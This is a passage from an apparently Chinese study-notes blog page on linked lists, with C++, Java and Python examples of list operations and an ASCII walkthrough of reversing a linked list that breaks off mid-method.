class="hljs-built_in">num</span>[i<span class="hljs-number">-1</span>]<br>移动零: <span class="hljs-built_in">num</span>[i]!=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h1 id="二-链表"><a href="#二-链表" class="headerlink" title="二.链表"></a>二.链表</h1><p>c++的操作</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;list&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> data;<br>    Node* next;<br>    <span class="hljs-built_in">Node</span>(<span class="hljs-type">int</span> data) : <span class="hljs-built_in">data</span>(data), <span class="hljs-built_in">next</span>(<span class="hljs-literal">nullptr</span>) &#123;&#125;<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LinkedList</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    Node* head;<br><br>    <span class="hljs-built_in">LinkedList</span>() : <span class="hljs-built_in">head</span>(<span class="hljs-literal">nullptr</span>) &#123;&#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">append</span><span class="hljs-params">(<span class="hljs-type">int</span> data)</span> </span>&#123;<br>        Node* newNode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Node</span>(data);<br>        <span class="hljs-keyword">if</span> (!head) &#123;<br>            head = newNode;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        Node* last = head;<br>        <span class="hljs-keyword">while</span> (last-&gt;next) &#123;<br>            last = last-&gt;next;<br>        &#125;<br>        last-&gt;next = newNode;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">prepend</span><span class="hljs-params">(<span class="hljs-type">int</span> data)</span> </span>&#123;<br>        Node* newNode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Node</span>(data);<br>        newNode-&gt;next = head;<br>        head = newNode;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">deleteWithValue</span><span class="hljs-params">(<span class="hljs-type">int</span> data)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!head) <span class="hljs-keyword">return</span>;<br><br>        <span class="hljs-keyword">if</span> (head-&gt;data == data) &#123;<br>            Node* temp = head;<br>            head = head-&gt;next;<br>            <span class="hljs-keyword">delete</span> temp;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        Node* current = head;<br>        <span class="hljs-keyword">while</span> (current-&gt;next &amp;&amp; current-&gt;next-&gt;data != data) &#123;<br>            current = current-&gt;next;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (current-&gt;next) &#123;<br>            Node* temp = current-&gt;next;<br>            current-&gt;next = current-&gt;next-&gt;next;<br>            <span class="hljs-keyword">delete</span> temp;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">printList</span><span class="hljs-params">()</span> </span>&#123;<br>        Node* current = head;<br>        <span class="hljs-keyword">while</span> (current) &#123;<br>            std::cout &lt;&lt; current-&gt;data &lt;&lt; <span class="hljs-string">&quot; -&gt; &quot;</span>;<br>            current = current-&gt;next;<br>        &#125;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;None&quot;</span> &lt;&lt; std::endl;<br>    &#125;<br><br>    ~<span class="hljs-built_in">LinkedList</span>() &#123;<br>        Node* current = head;<br>        <span class="hljs-keyword">while</span> (current) &#123;<br>            Node* next = current-&gt;next;<br>            <span class="hljs-keyword">delete</span> current;<br>            current = next;<br>        &#125;<br>    &#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 使用链表类</span><br>    LinkedList myList;<br>    myList.<span class="hljs-built_in">append</span>(<span class="hljs-number">1</span>);<br>    myList.<span class="hljs-built_in">append</span>(<span class="hljs-number">2</span>);<br>    myList.<span class="hljs-built_in">append</span>(<span class="hljs-number">3</span>);<br>    myList.<span class="hljs-built_in">prepend</span>(<span class="hljs-number">0</span>);<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Linked list after additions: &quot;</span>;<br>    myList.<span class="hljs-built_in">printList</span>();  <span class="hljs-comment">// 输出: 0 -&gt; 1 -&gt; 2 -&gt; 3 -&gt; None</span><br><br>    myList.<span class="hljs-built_in">deleteWithValue</span>(<span class="hljs-number">2</span>);<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Linked list after deleting 2: &quot;</span>;<br>    myList.<span class="hljs-built_in">printList</span>();  <span class="hljs-comment">// 输出: 0 -&gt; 1 -&gt; 3 -&gt; None</span><br><br>    <span class="hljs-comment">// 使用 std::list 示例</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Using std::list:&quot;</span> &lt;&lt; std::endl;<br>    std::list&lt;<span class="hljs-type">int</span>&gt; lst = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;<br><br>    <span class="hljs-comment">// 添加元素</span><br>    lst.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">4</span>);<br>    lst.<span class="hljs-built_in">push_front</span>(<span class="hljs-number">0</span>);<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;List after additions: &quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> n : lst) &#123;<br>        std::cout &lt;&lt; n &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    std::cout &lt;&lt; std::endl;<br><br>    <span class="hljs-comment">// 访问元素</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;First element: &quot;</span> &lt;&lt; lst.<span class="hljs-built_in">front</span>() &lt;&lt; std::endl;  <span class="hljs-comment">// 输出: 0</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Last element: &quot;</span> &lt;&lt; lst.<span class="hljs-built_in">back</span>() &lt;&lt; std::endl;    <span class="hljs-comment">// 输出: 4</span><br><br>    <span class="hljs-comment">// 修改元素</span><br>    <span class="hljs-keyword">auto</span> it = lst.<span class="hljs-built_in">begin</span>();<br>    ++it;  <span class="hljs-comment">// 指向第二个元素</span><br>    *it = <span class="hljs-number">10</span>;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;List after modifying second element: &quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> n : lst) &#123;<br>        std::cout &lt;&lt; n &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    std::cout &lt;&lt; std::endl;<br><br>    <span class="hljs-comment">// 删除元素</span><br>    lst.<span class="hljs-built_in">remove</span>(<span class="hljs-number">10</span>);<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;List after removing 10: &quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> n : lst) &#123;<br>        std::cout &lt;&lt; n &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    std::cout &lt;&lt; std::endl;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>链表类（LinkedList）:<br><br><span class="hljs-built_in">append</span>(<span class="hljs-type">int</span> data)：在链表末尾添加元素。<br><span class="hljs-built_in">prepend</span>(<span class="hljs-type">int</span> data)：在链表头部添加元素。<br><span class="hljs-built_in">deleteWithValue</span>(<span class="hljs-type">int</span> data)：删除值为 data 的节点。<br><span class="hljs-built_in">printList</span>()：打印链表中的所有元素。<br>析构函数 ~<span class="hljs-built_in">LinkedList</span>()：释放链表占用的内存。<br>std::list 示例:<br><br><span class="hljs-built_in">push_back</span>(<span class="hljs-type">int</span> value)：在列表末尾添加元素。<br><span class="hljs-built_in">push_front</span>(<span class="hljs-type">int</span> value)：在列表头部添加元素。<br><span class="hljs-built_in">front</span>()：访问第一个元素。<br><span class="hljs-built_in">back</span>()：访问最后一个元素。<br>通过迭代器修改元素。<br><span class="hljs-built_in">remove</span>(<span class="hljs-type">int</span> value)：删除值为 value 的所有元素。<br></code></pre></td></tr></table></figure><p>java的操作</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">import</span> java.util.LinkedList;<br><span class="hljs-keyword">import</span> java.util.Iterator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> java1 &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> main(String[] args) &#123;<br>        <span class="hljs-comment">// 初始化链表</span><br>        LinkedList&lt;Integer&gt; list = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br><br>        <span class="hljs-comment">// 添加元素</span><br>        list.add(<span class="hljs-number">1</span>);<br>        list.add(<span class="hljs-number">2</span>);<br>        list.add(<span class="hljs-number">3</span>);<br>        System.out.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;Initial list: &quot;</span> + list); <span class="hljs-comment">// 输出 [1, 2, 3]</span><br><br>        <span class="hljs-comment">// 访问元素</span><br>        System.out.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;First element: &quot;</span> + list.getFirst()); <span class="hljs-comment">// 输出 1</span><br>        System.out.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;Last element: &quot;</span> + list.getLast());   <span class="hljs-comment">// 输出 3</span><br><br>        <span class="hljs-comment">// 修改元素</span><br>        list.set(<span class="hljs-number">1</span>, <span class="hljs-number">20</span>);  <span class="hljs-comment">// 修改索引1处的元素</span><br>        System.out.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;List after modification: &quot;</span> + list); <span class="hljs-comment">// 输出 [1, 20, 3]</span><br><br>        <span class="hljs-comment">// 删除元素</span><br>        list.remove(<span class="hljs-number">1</span>); <span class="hljs-comment">// 删除索引1处的元素</span><br>        System.out.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;List after removal: &quot;</span> + list); <span class="hljs-comment">// 输出 [1, 3]</span><br><br>        <span class="hljs-comment">// 链表大小</span><br>        System.out.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;Size of the list: &quot;</span> + list.<span class="hljs-keyword">size</span>()); <span class="hljs-comment">// 输出 2</span><br><br>        <span class="hljs-comment">// 遍历链表</span><br>        System.out.<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Traversing list using for-each loop: &quot;</span>);<br>        <span class="hljs-keyword">for</span> (Integer element : list) &#123;<br>            System.out.<span class="hljs-keyword">print</span>(element + <span class="hljs-string">&quot; &quot;</span>); <span class="hljs-comment">// 输出 1 3</span><br>        &#125;<br>        System.out.<span class="hljs-keyword">println</span>();<br><br>        <span class="hljs-comment">// 使用迭代器遍历链表</span><br>        System.out.<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Traversing list using iterator: &quot;</span>);<br>        Iterator&lt;Integer&gt; iterator = list.iterator();<br>        <span class="hljs-keyword">while</span> (iterator.hasNext()) &#123;<br>            System.out.<span class="hljs-keyword">print</span>(iterator.<span class="hljs-keyword">next</span>() + <span class="hljs-string">&quot; &quot;</span>); <span class="hljs-comment">// 输出 1 3</span><br>        &#125;<br>        System.out.<span class="hljs-keyword">println</span>();<br><br>        <span class="hljs-comment">// 使用索引遍历链表</span><br>        System.out.<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Traversing list using for loop: &quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; list.<span class="hljs-keyword">size</span>(); i++) &#123;<br>            System.out.<span class="hljs-keyword">print</span>(list.get(i) + <span class="hljs-string">&quot; &quot;</span>); <span class="hljs-comment">// 输出 1 3</span><br>        &#125;<br>        System.out.<span class="hljs-keyword">println</span>();<br><br>        <span class="hljs-comment">// 使用Deque操作</span><br>        list.addFirst(<span class="hljs-number">0</span>); <span class="hljs-comment">// 在头部添加元素</span><br>        list.addLast(<span class="hljs-number">4</span>);  <span class="hljs-comment">// 在尾部添加元素</span><br>        System.out.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;List after deque operations: &quot;</span> + list); <span class="hljs-comment">// 输出 [0, 1, 3, 4]</span><br><br>        <span class="hljs-comment">// 删除Deque操作</span><br>        list.removeFirst(); <span class="hljs-comment">// 删除头部元素</span><br>        list.removeLast();  <span class="hljs-comment">// 删除尾部元素</span><br>        System.out.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;List after removing first and last: &quot;</span> + list); <span class="hljs-comment">// 输出 [1, 3]</span><br><br>        <span class="hljs-comment">// 检查元素是否存在</span><br>        <span class="hljs-keyword">boolean</span> contains = list.contains(<span class="hljs-number">3</span>);<br>        System.out.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;List contains 3: &quot;</span> + contains); <span class="hljs-comment">// 输出 true</span><br><br>        <span class="hljs-comment">// 清空链表</span><br>        list.clear();<br>        System.out.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;List after clear: &quot;</span> + list); <span class="hljs-comment">// 输出 []</span><br>        System.out.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;Size of the list after clear: &quot;</span> + list.<span class="hljs-keyword">size</span>()); <span class="hljs-comment">// 输出 0</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>py的操作</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 使用 Python 内置的 list</span><br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;Using Python list:&quot;</span>)<br><br><span class="hljs-comment"># 初始化列表</span><br><span class="hljs-attribute">lst</span> =<span class="hljs-meta"> [1, 2, 3]</span><br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;Initial list:&quot;</span>, lst)  # 输出<span class="hljs-meta"> [1, 2, 3]</span><br><br><span class="hljs-comment"># 添加元素</span><br><span class="hljs-attribute">lst</span>.append(<span class="hljs-number">4</span>)  # 在末尾添加元素<br><span class="hljs-attribute">lst</span>.insert(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>.<span class="hljs-number">5</span>)  # 在索引<span class="hljs-number">1</span>处插入元素<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;List after additions:&quot;</span>, lst)  # 输出<span class="hljs-meta"> [1, 1.5, 2, 3, 4]</span><br><br><span class="hljs-comment"># 访问元素</span><br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;First element:&quot;</span>, lst[<span class="hljs-number">0</span>])  # 输出 <span class="hljs-number">1</span><br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;Last element:&quot;</span>, lst[-<span class="hljs-number">1</span>])  # 输出 <span class="hljs-number">4</span><br><br><span class="hljs-comment"># 修改元素</span><br><span class="hljs-attribute">lst</span>[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;List after modification:&quot;</span>, lst)  # 输出<span class="hljs-meta"> [1, 1.8, 2, 3, 4]</span><br><br><span class="hljs-comment"># 删除元素</span><br><span class="hljs-attribute">lst</span>.remove(<span class="hljs-number">1</span>.<span class="hljs-number">8</span>)  # 删除值为<span class="hljs-number">1</span>.<span class="hljs-number">8</span>的元素<br><span class="hljs-attribute">del</span> lst[<span class="hljs-number">0</span>]  # 删除索引<span class="hljs-number">0</span>处的元素<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;List after deletions:&quot;</span>, lst)  # 输出<span class="hljs-meta"> [2, 3, 4]</span><br><br><span class="hljs-comment"># 列表长度</span><br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;Length of the list:&quot;</span>, len(lst))  # 输出 <span class="hljs-number">3</span><br><br><span class="hljs-comment"># 遍历列表</span><br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;Traversing the list:&quot;</span>)<br><span class="hljs-attribute">for</span> item in lst:<br>    <span class="hljs-attribute">print</span>(item, end=<span class="hljs-string">&quot; &quot;</span>)  # 输出 <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;\n&quot;</span>)<br><br><span class="hljs-comment">### 使用 `collections.deque`</span><br><br><br><span class="hljs-attribute">from</span> collections import deque<br><br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;Using collections.deque:&quot;</span>)<br><br><span class="hljs-comment"># 初始化deque</span><br><span class="hljs-attribute">d</span> = deque([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>])<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;Initial deque:&quot;</span>, d)  # 输出 deque([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>])<br><br><span class="hljs-comment"># 添加元素</span><br><span class="hljs-attribute">d</span>.append(<span class="hljs-number">4</span>)  # 在尾部添加<br><span class="hljs-attribute">d</span>.appendleft(<span class="hljs-number">0</span>)  # 在头部添加<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;Deque after additions:&quot;</span>, d)  # 输出 deque([<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>])<br><br><span class="hljs-comment"># 访问元素（需要转换为列表）</span><br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;First element:&quot;</span>, d[<span class="hljs-number">0</span>])  # 输出 <span class="hljs-number">0</span><br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;Last element:&quot;</span>, d[-<span class="hljs-number">1</span>])  # 输出 <span class="hljs-number">4</span><br><br><span class="hljs-comment"># 修改元素（需要转换为列表）</span><br><span class="hljs-attribute">d_list</span> = list(d)<br><span class="hljs-attribute">d_list</span>[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>.<span class="hljs-number">5</span><br><span class="hljs-attribute">d</span> = deque(d_list)<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;Deque after modification:&quot;</span>, d)  # 输出 deque([<span class="hljs-number">0</span>, <span class="hljs-number">1</span>.<span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>])<br><br><span class="hljs-comment"># 删除元素</span><br><span class="hljs-attribute">d</span>.pop()  # 删除尾部元素<br><span class="hljs-attribute">d</span>.popleft()  # 删除头部元素<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;Deque after deletions:&quot;</span>, d)  # 输出 deque([<span class="hljs-number">1</span>.<span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>])<br><br><span class="hljs-comment"># deque长度</span><br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;Length of the deque:&quot;</span>, len(d))  # 输出 <span class="hljs-number">3</span><br><br><span class="hljs-comment"># 遍历deque</span><br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;Traversing the deque:&quot;</span>)<br><span class="hljs-attribute">for</span> item in d:<br>    <span class="hljs-attribute">print</span>(item, end=<span class="hljs-string">&quot; &quot;</span>)  # 输出 <span class="hljs-number">1</span>.<span class="hljs-number">5</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h2 id="经验-1"><a href="#经验-1" class="headerlink" title="经验"></a>经验</h2><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">head  head 是一个指针，指向链表的第一个节点，因此它表示整个链表的起始点<br>  |<span class="hljs-string"></span><br><span class="hljs-string">  v</span><br><span class="hljs-string">  ______      ______      ______</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  1   </span>|<span class="hljs-string"> -&gt; </span>|<span class="hljs-string">  2   </span>|<span class="hljs-string"> -&gt; </span>|<span class="hljs-string">  3   </span>|<span class="hljs-string"> -&gt; null</span><br><span class="hljs-string">  ------      ------      ------</span><br><span class="hljs-string"></span><br><span class="hljs-string">ListNode nextHead = head.next;</span><br><span class="hljs-string">head</span><br><span class="hljs-string">  </span>|<br>  v<br>  ______      ______      ______<br> |<span class="hljs-string">  1   </span>|<span class="hljs-string"> -&gt; </span>|<span class="hljs-string">  2   </span>|<span class="hljs-string"> -&gt; </span>|<span class="hljs-string">  3   </span>|<span class="hljs-string"> -&gt; null</span><br><span class="hljs-string">  ------      ------</span><br><span class="hljs-string">     ^</span><br><span class="hljs-string">     </span>|<br>nextHead<br> head.next = last; <br>head<br>  |<span class="hljs-string"></span><br><span class="hljs-string">  v</span><br><span class="hljs-string">  ______      ______      ______</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  1   </span>|<span class="hljs-string">    </span>|<span class="hljs-string">  2   </span>|<span class="hljs-string"> -&gt; </span>|<span class="hljs-string">  3   </span>|<span class="hljs-string"> -&gt; null</span><br><span class="hljs-string">  ------      ------</span><br><span class="hljs-string">    </span>|<br>   null<br>last = head; <br>last<br>  |<span class="hljs-string"></span><br><span class="hljs-string">  v</span><br><span class="hljs-string">  ______      ______      ______</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  1   </span>|<span class="hljs-string">    </span>|<span class="hljs-string">  2   </span>|<span class="hljs-string"> -&gt; </span>|<span class="hljs-string">  3   </span>|<span class="hljs-string"> -&gt; null</span><br><span class="hljs-string">  ------</span><br><span class="hljs-string">    </span>|<br>   null<br>head<br>head = nextHead<br>last            head<br>  |<span class="hljs-string">              </span>|<br>  v              v<br>  ______      ______      ______<br> |<span class="hljs-string">  1   </span>|<span class="hljs-string">    </span>|<span class="hljs-string">  2   </span>|<span class="hljs-string"> -&gt; </span>|<span class="hljs-string">  3   </span>|<span class="hljs-string"> -&gt; null</span><br><span class="hljs-string">  ------      ------</span><br><span class="hljs-string">    </span>|<br>   null<br><br><br> public ListNode reverseList(ListNode head) &#123;        <br>        ListNode last = null;<br>        while (head != null) &#123;<br>            ListNode nextHead = head.next;  // 暂存下一个节点<br>            head.next = last;              // 